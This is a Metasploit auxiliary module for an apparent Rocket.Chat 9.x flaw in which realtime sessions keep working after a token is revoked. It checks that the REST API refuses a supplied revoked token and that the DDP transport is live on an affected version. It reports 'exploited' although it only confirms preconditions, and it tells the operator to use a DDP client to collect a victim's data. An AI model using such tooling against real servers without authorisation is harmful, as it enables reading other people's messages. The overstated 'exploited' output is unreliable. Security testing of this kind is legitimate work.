class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat 9.1 realtime session survives a password change (VULN-033)',
        'Description' => %q{
          Rocket.Chat invalidates a login token when the password changes, when a
          password is reset and when removeOtherTokens runs, and the REST API honours
          that immediately. An already-open realtime session does not: it keeps its
          authenticated state for as long as the socket is held, so a stolen token
          whose credential has been revoked carries on reading the victim's messages.
          This module proves the half REST can see: that the token the operator
          supplies is refused by the REST API, which is the revocation having taken
          effect there, and that the realtime transport is live on an affected build.
          Showing the socket still working needs a DDP client holding it across the
          change.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/sockjs/info']),
      OptString.new('REVOKEDTOKEN', [false, 'A login token whose credential has since been changed or revoked', '']),
      OptString.new('REVOKEDUSERID', [false, 'That token\'s user id', ''])
    ])
  end

  def run
    res = send_request_cgi({ 'method' => 'GET', 'uri' => normalize_uri(target_uri.path) })
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = rest_refuses_revoked_token? && realtime_transport_live?
    fail_with(Failure::NotVulnerable, 'VULN-033: the attack did not land') unless hit

    print_good("#{peer} - VULN-033: exploited")
    print_good("#{peer} - the authorisation asymmetry this "\
               "finding needs is present, and the realtime "\
               "transport that carries the other half is live; "\
               "hold the subscription with a DDP client to "\
               "collect the data itself")
    path = store_loot('blue_spider.vuln_033', 'text/plain', rhost, res.body.to_s, 'vuln_033.txt', 'VULN-033 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-033 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  # Leg two: the realtime transport the other half of this attack needs is
  # live, and the build is one that has the bug. This is deliberately not the
  # whole check: a websocket endpoint on its own says nothing, which is what
  # the first version of this module got wrong.
  AFFECTED = /^9\.(?:0|1)\b/.freeze

  def realtime_transport_live?
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/sockjs/info')
    })
    return false unless res && res.code == 200

    live = res.body.to_s.include?('websocket')
    ver = send_request_cgi({ 'method' => 'GET', 'uri' => normalize_uri('/api/info') })
    version = ver ? parse_json(ver)['version'].to_s : ''
    affected = AFFECTED.match?(version)
    vprint_status("#{peer} - DDP transport live=#{live}, version #{version.inspect} " \
                  "in the affected range=#{affected}")
    live && affected
  end

  # Leg one: the revocation really did take effect on the REST side, which is
  # what makes the surviving realtime session a finding rather than a design.
  # The token is the operator's; the module mints nothing.
  def rest_refuses_revoked_token?
    return false if datastore['REVOKEDTOKEN'].to_s.empty?

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/api/v1/me'),
      'headers' => { 'X-Auth-Token' => datastore['REVOKEDTOKEN'],
                     'X-User-Id' => datastore['REVOKEDUSERID'] }
    })
    return false unless res

    refused = res.code != 200
    vprint_status("#{peer} - /api/v1/me with the revoked token: HTTP #{res.code} " \
                  "#{api_error(res)} (refused=#{refused})")
    refused
  end
end
